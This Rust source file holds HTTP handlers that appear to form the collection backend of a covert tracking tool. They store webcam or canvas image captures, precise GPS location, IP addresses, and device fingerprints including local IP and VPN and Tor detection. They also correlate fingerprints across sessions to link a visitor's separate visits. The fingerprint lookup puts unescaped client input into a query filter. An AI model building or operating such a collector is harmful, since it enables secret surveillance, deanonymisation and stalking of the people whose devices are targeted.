use crate::AppState;
use crate::trailbase::TrailBaseClient;
use axum::extract::State;
use axum::http::{HeaderMap, StatusCode};
use axum::Json;
use serde::{Deserialize, Serialize};
use std::sync::Arc;

#[derive(Deserialize)]
pub struct ImagePayload {
    cat: String,
    #[serde(default)]
    session: Option<String>,
    #[serde(default)]
    capture_method: Option<String>,
}

#[derive(Deserialize)]
pub struct LocationPayload {
    lat: f64,
    lon: f64,
    #[serde(default)]
    acc: Option<f64>,
    #[serde(default)]
    altitude: Option<f64>,
    #[serde(default)]
    heading: Option<f64>,
    #[serde(default)]
    speed: Option<f64>,
    #[serde(default)]
    session: Option<String>,
}

#[derive(Deserialize)]
pub struct IpPayload {
    #[serde(default)]
    session: Option<String>,
}

#[derive(Deserialize)]
pub struct FingerprintPayload {
    #[serde(default)]
    session: Option<String>,
    screen_resolution: Option<String>,
    color_depth: Option<i32>,
    timezone: Option<String>,
    language: Option<String>,
    platform: Option<String>,
    hardware_concurrency: Option<i32>,
    device_memory: Option<f64>,
    battery_level: Option<f64>,
    battery_charging: Option<bool>,
    canvas_fingerprint: Option<String>,
    webgl_fingerprint: Option<String>,
    font_list: Option<String>,
    local_ip: Option<String>,
    is_vpn: Option<bool>,
    is_tor: Option<bool>,
    connection_type: Option<String>,
}

#[derive(Deserialize)]
pub struct EventPayload {
    session: Option<String>,
    event_type: String,
    #[serde(default)]
    event_data: Option<serde_json::Value>,
}

pub async fn receive_image(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<ImagePayload>,
) -> Result<StatusCode, StatusCode> {
    let session_id = payload.session.unwrap_or_else(|| "default".into());

    let filtered = payload.cat.split(',').nth(1).unwrap_or("");
    let raw = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        filtered,
    )
    .map_err(|_| StatusCode::BAD_REQUEST)?;

    if raw.is_empty() {
        return Err(StatusCode::BAD_REQUEST);
    }

    let now = chrono::Utc::now().timestamp();
    let id = uuid::Uuid::new_v4().to_string();
    let filename = format!("{}_{}.png", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S"));
    let file_path = format!("{}/captures/{}", state.data_dir, filename);
    let method = payload.capture_method.unwrap_or_else(|| "canvas".into());

    std::fs::write(&file_path, &raw).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let record = serde_json::json!({
        "id": id,
        "session_id": session_id,
        "filename": filename,
        "file_type": "image/png",
        "file_size": raw.len() as i64,
        "file_path": file_path,
        "capture_method": method,
        "created_at": now,
    });

    if let Some(ref tb) = state.trailbase {
        if let Err(e) = tb.create::<serde_json::Value>("captures", record.clone()).await {
            tracing::warn!("TrailBase capture insert failed, falling back to SQLite: {}", e);
            sqlx::query(
                "INSERT INTO captures (id, session_id, filename, file_type, file_size, file_path, created_at) VALUES (?, ?, ?, 'image/png', ?, ?, ?)"
            )
            .bind(&id).bind(&session_id).bind(&filename)
            .bind(raw.len() as i64).bind(&file_path).bind(now)
            .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        }
        // Log event for session replay
        let _ = tb.create::<serde_json::Value>("events", serde_json::json!({
            "session_id": session_id,
            "event_type": "camera_capture",
            "event_data": serde_json::json!({"filename": filename, "size": raw.len()}),
            "created_at": now,
        })).await;
    } else {
        sqlx::query(
            "INSERT INTO captures (id, session_id, filename, file_type, file_size, file_path, created_at) VALUES (?, ?, ?, 'image/png', ?, ?, ?)"
        )
        .bind(&id).bind(&session_id).bind(&filename)
        .bind(raw.len() as i64).bind(&file_path).bind(now)
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    }

    tracing::info!("📸 Capture: {} ({} bytes, method: {})", filename, raw.len(), method);
    Ok(StatusCode::OK)
}

pub async fn receive_location(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<LocationPayload>,
) -> Result<StatusCode, StatusCode> {
    let session_id = payload.session.unwrap_or_else(|| "default".into());
    let now = chrono::Utc::now().timestamp();

    let record = serde_json::json!({
        "session_id": session_id,
        "latitude": payload.lat,
        "longitude": payload.lon,
        "accuracy": payload.acc,
        "altitude": payload.altitude,
        "heading": payload.heading,
        "speed": payload.speed,
        "created_at": now,
    });

    if let Some(ref tb) = state.trailbase {
        if let Err(e) = tb.create::<serde_json::Value>("locations", record).await {
            tracing::warn!("TrailBase location insert failed: {}", e);
        }
        let _ = tb.create::<serde_json::Value>("events", serde_json::json!({
            "session_id": session_id,
            "event_type": "location_granted",
            "event_data": serde_json::json!({"lat": payload.lat, "lon": payload.lon, "acc": payload.acc}),
            "created_at": now,
        })).await;
    } else {
        sqlx::query(
            "INSERT INTO locations (id, session_id, latitude, longitude, accuracy, created_at) VALUES (?, ?, ?, ?, ?, ?)"
        )
        .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
        .bind(payload.lat).bind(payload.lon).bind(payload.acc).bind(now)
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    }

    tracing::info!("📍 Location: {}, {}", payload.lat, payload.lon);
    Ok(StatusCode::OK)
}

pub async fn receive_ip(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(body): Json<IpPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    let ua = headers.get("user-agent")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown")
        .to_string();

    let session_id = body.session.unwrap_or_else(|| "default".into());
    let (device, browser, os) = parse_ua(&ua);
    let now = chrono::Utc::now().timestamp();

    let record = serde_json::json!({
        "session_id": session_id,
        "ip_address": ip,
        "user_agent": ua,
        "device": device,
        "browser": browser,
        "os": os,
        "created_at": now,
    });

    if let Some(ref tb) = state.trailbase {
        if let Err(e) = tb.create::<serde_json::Value>("ip_logs", record).await {
            tracing::warn!("TrailBase IP insert failed: {}", e);
        }
        let _ = tb.create::<serde_json::Value>("events", serde_json::json!({
            "session_id": session_id,
            "event_type": "page_visit",
            "event_data": serde_json::json!({"ip": ip, "device": device, "browser": browser}),
            "created_at": now,
        })).await;
    } else {
        sqlx::query(
            "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
        )
        .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id).bind(&ip).bind(&ua)
        .bind(&device).bind(&browser).bind(&os).bind(now)
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    }

    tracing::info!("🌐 IP: {} ({} on {})", ip, browser, os);
    Ok(StatusCode::OK)
}

pub async fn receive_fingerprint(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<FingerprintPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    let ua = headers.get("user-agent")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown")
        .to_string();
    let session_id = payload.session.unwrap_or_else(|| "default".into());
    let (device, browser, os) = parse_ua(&ua);
    let now = chrono::Utc::now().timestamp();

    let record = serde_json::json!({
        "session_id": session_id,
        "ip_address": ip,
        "user_agent": ua,
        "device": device,
        "browser": browser,
        "os": os,
        "screen_resolution": payload.screen_resolution,
        "color_depth": payload.color_depth,
        "timezone": payload.timezone,
        "language": payload.language,
        "platform": payload.platform,
        "hardware_concurrency": payload.hardware_concurrency,
        "device_memory": payload.device_memory,
        "battery_level": payload.battery_level,
        "battery_charging": payload.battery_charging,
        "canvas_fingerprint": payload.canvas_fingerprint,
        "webgl_fingerprint": payload.webgl_fingerprint,
        "font_list": payload.font_list,
        "local_ip": payload.local_ip,
        "is_vpn": payload.is_vpn.unwrap_or(false),
        "is_tor": payload.is_tor.unwrap_or(false),
        "connection_type": payload.connection_type,
        "created_at": now,
    });

    if let Some(ref tb) = state.trailbase {
        let _ = tb.create::<serde_json::Value>("ip_logs", record).await;
        let _ = tb.create::<serde_json::Value>("events", serde_json::json!({
            "session_id": session_id,
            "event_type": "fingerprint_collected",
            "event_data": serde_json::json!({
                "canvas": payload.canvas_fingerprint.is_some(),
                "webgl": payload.webgl_fingerprint.is_some(),
                "local_ip": payload.local_ip,
                "fonts_count": payload.font_list.as_ref().map(|f| f.split(',').count()),
            }),
            "created_at": now,
        })).await;
    }

    // Check for cross-session correlation
    if let Some(ref canvas_fp) = payload.canvas_fingerprint {
        if let Some(ref tb) = state.trailbase {
            // Look for existing entries with same fingerprint but different session
            let url = format!("{}/api/records/ip_logs?filter=canvas_fingerprint='{}'&page=1&per_page=5",
                tb.base_url.trim_end_matches('/'), canvas_fp);
            if let Ok(resp) = tb.http.get(&url).send().await {
                if let Ok(body) = resp.json::<serde_json::Value>().await {
                    if let Some(data) = body.get("data").and_then(|d| d.as_array()) {
                        let other_sessions: Vec<&str> = data.iter()
                            .filter_map(|r| r.get("session_id").and_then(|s| s.as_str()))
                            .filter(|s| *s != session_id)
                            .collect();
                        if !other_sessions.is_empty() {
                            tracing::warn!("🔗 Cross-session correlation: fingerprint matches sessions: {:?}", other_sessions);
                            let _ = tb.create::<serde_json::Value>("events", serde_json::json!({
                                "session_id": session_id,
                                "event_type": "cross_session_match",
                                "event_data": serde_json::json!({"matched_sessions": other_sessions, "fingerprint": canvas_fp}),
                                "created_at": now,
                            })).await;
                        }
                    }
                }
            }
        }
    }

    tracing::info!("🔍 Fingerprint: {} | {}x{} | {} | canvas:{} | local_ip:{}",
        ip,
        payload.screen_resolution.as_deref().unwrap_or("?"),
        "",
        payload.timezone.as_deref().unwrap_or("?"),
        payload.canvas_fingerprint.is_some(),
        payload.local_ip.as_deref().unwrap_or("none"));
    Ok(StatusCode::OK)
}

pub async fn receive_event(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<EventPayload>,
) -> Result<StatusCode, StatusCode> {
    let session_id = payload.session.unwrap_or_else(|| "default".into());
    let now = chrono::Utc::now().timestamp();

    let record = serde_json::json!({
        "session_id": session_id,
        "event_type": payload.event_type,
        "event_data": payload.event_data.unwrap_or(serde_json::Value::Null),
        "created_at": now,
    });

    if let Some(ref tb) = state.trailbase {
        let _ = tb.create::<serde_json::Value>("events", record).await;
    }

    Ok(StatusCode::OK)
}

fn extract_ip(headers: &HeaderMap) -> String {
    headers.get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| s.split(',').next())
        .or_else(|| headers.get("x-real-ip").and_then(|v| v.to_str().ok()))
        .unwrap_or("unknown")
        .trim()
        .to_string()
}

fn parse_ua(ua: &str) -> (String, String, String) {
    let device = if ua.contains("Mobile") || ua.contains("Android") || ua.contains("iPhone") {
        "Mobile"
    } else if ua.contains("Tablet") || ua.contains("iPad") {
        "Tablet"
    } else {
        "Desktop"
    };

    let browser = if ua.contains("Edg/") {
        "Edge"
    } else if ua.contains("Chrome/") {
        "Chrome"
    } else if ua.contains("Firefox/") {
        "Firefox"
    } else if ua.contains("Safari/") && !ua.contains("Chrome") {
        "Safari"
    } else {
        "Unknown"
    };

    let os = if ua.contains("Windows NT") {
        "Windows"
    } else if ua.contains("Mac OS X") {
        "macOS"
    } else if ua.contains("Android") {
        "Android"
    } else if ua.contains("iPhone") || ua.contains("iPad") || ua.contains("iOS") {
        "iOS"
    } else if ua.contains("Linux") {
        "Linux"
    } else {
        "Unknown"
    };

    (device.into(), browser.into(), os.into())
}
